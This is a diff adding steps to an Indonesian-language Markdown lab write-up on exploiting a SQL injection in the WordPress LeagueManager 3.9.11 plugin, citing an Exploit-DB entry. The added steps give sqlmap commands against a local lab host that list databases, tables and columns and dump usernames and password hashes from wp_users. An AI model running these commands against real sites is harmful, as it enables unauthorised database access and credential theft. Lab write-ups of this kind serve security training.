@@ -88,3 +88,11 @@ Setelah tahap clone, pindah direktori pada folder sqlmap anda, lalu bisa dijalan
 ### LeagueManager
 Berdasarkan tautan https://www.exploit-db.com/exploits/37182/ , Pada plugin leaguemanager versi 3.9.11 terdapat bug, salah satunya pada parameter league_id yang tidak diamankan sehingga dimungkinkan sql injection.
 ![hasil eksploit](sqlmap_leagumemanager.png)
+1. Setelah diketahui terdapat variabel yang bisa dieksploit, kita bisa menggunakan sql map untuk database listing. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql --dbs`
+![hasil dbs listing](hasil_list_dbs.png)
+2. Selanjutnya kita dapat melakukan table listing. Kita coba list semua table pada database wordpress karena kemungkinan database situs disimpan disitu. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql  -D wordpress --tables`
+![hasil tables listing](hasil_list_tables.png)
+3. Selanjutnya kita akan melakukan listing ke tabel wp_users karena disitu kemungkinan berisi login informasi. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql  -D wordpress -T wp_users --columns`
+![hasil list columns](hasil_list_columns.png)
+4. Dump isi table wp_users. Syntax: `sqlmap --url "http://192.168.1.14/wordpress/?season=1&league_id=1&match_day=1&team_id=1" --dbms mysql  -D wordpress -T wp_users -C user_login,user_pass --dump`
+![hasil dump users](hasil_dump_users.png)
